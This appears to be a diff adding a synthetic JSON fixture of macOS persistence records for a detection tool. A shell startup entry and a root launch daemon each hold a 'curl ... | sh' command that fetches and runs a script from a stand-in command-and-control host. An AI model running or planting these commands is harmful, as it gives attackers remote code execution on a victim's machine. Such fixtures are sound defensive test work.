@@ -1,0 +1,122 @@
+{
+  "collected_at": "2026-03-10T14:30:00.000000Z",
+  "records": [
+    {
+      "group": "wheel",
+      "keep_alive": false,
+      "kind": "launch_daemon",
+      "label": "com.vendor.legit.helper",
+      "mode": "0644",
+      "mtime": "2026-02-01T10:00:00.000000Z",
+      "owner": "root",
+      "path": "/Library/LaunchDaemons/com.vendor.legit.plist",
+      "program_codesign": {
+        "identifier": "com.vendor.legit.helper",
+        "status": "signed",
+        "team_id": "SYNTH12345"
+      },
+      "program_exists": true,
+      "program_path": "/Library/PrivilegedHelperTools/com.vendor.legit.helper",
+      "program_sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "run_at_load": true,
+      "scope": "system",
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+    },
+    {
+      "group": "wheel",
+      "keep_alive": false,
+      "kind": "launch_agent",
+      "label": "com.microsoft.update.agent",
+      "mode": "0644",
+      "mtime": "2026-02-01T10:00:00.000000Z",
+      "owner": "root",
+      "path": "/Library/LaunchAgents/com.microsoft.update.agent.plist",
+      "program_codesign": {
+        "identifier": "com.microsoft.update",
+        "status": "signed",
+        "team_id": "UBF8T346G9"
+      },
+      "program_exists": true,
+      "program_path": "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft Update Assistant",
+      "program_sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+      "run_at_load": true,
+      "scope": "system",
+      "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
+    },
+    {
+      "group": "staff",
+      "kind": "shell_startup",
+      "lines_of_interest": [
+        "curl -s http://c2.malicious.example.test/x.sh | sh"
+      ],
+      "mode": "0644",
+      "mtime": "2026-03-10T14:03:00.000000Z",
+      "owner": "alice",
+      "path": "/Users/alice/.zshrc",
+      "scope": "user",
+      "sha256": "4444444444444444444444444444444444444444444444444444444444444444"
+    },
+    {
+      "group": "staff",
+      "keep_alive": true,
+      "kind": "launch_agent",
+      "label": "com.example.updater",
+      "mode": "0644",
+      "mtime": "2026-03-10T14:01:00.000000Z",
+      "owner": "alice",
+      "path": "/Users/alice/Library/LaunchAgents/com.example.updater.plist",
+      "program_arguments": [
+        "/private/tmp/.updater",
+        "--background"
+      ],
+      "program_codesign": {
+        "identifier": null,
+        "status": "unsigned",
+        "team_id": null
+      },
+      "program_exists": true,
+      "program_path": "/private/tmp/.updater",
+      "program_sha256": "e35e17e932059ca07b1436091b5ca79569134f0e3ff10f83d9bc0a74a032accf",
+      "run_at_load": true,
+      "scope": "user",
+      "sha256": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
+    },
+    {
+      "group": "staff",
+      "keep_alive": false,
+      "kind": "launch_agent",
+      "label": "com.example.old",
+      "mode": "0644",
+      "mtime": "2025-11-02T10:00:00.000000Z",
+      "owner": "alice",
+      "path": "/Users/alice/Library/LaunchAgents/com.example.old.plist",
+      "program_exists": false,
+      "program_path": "/Applications/Old.app/Contents/MacOS/old",
+      "run_at_load": true,
+      "scope": "user",
+      "sha256": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "group": "wheel",
+      "keep_alive": false,
+      "kind": "launch_daemon",
+      "label": "com.example.helper",
+      "mode": "0666",
+      "mtime": "2026-03-10T14:02:00.000000Z",
+      "owner": "root",
+      "path": "/Library/LaunchDaemons/com.example.helper.plist",
+      "program_arguments": [
+        "/bin/sh",
+        "-c",
+        "curl -s http://c2.malicious.example.test/stage.sh | sh"
+      ],
+      "program_exists": true,
+      "program_path": "/bin/sh",
+      "run_at_load": true,
+      "scope": "system",
+      "sha256": "9999999999999999999999999999999999999999999999999999999999999999"
+    }
+  ],
+  "schema_version": 1,
+  "source": "persistence"
+}
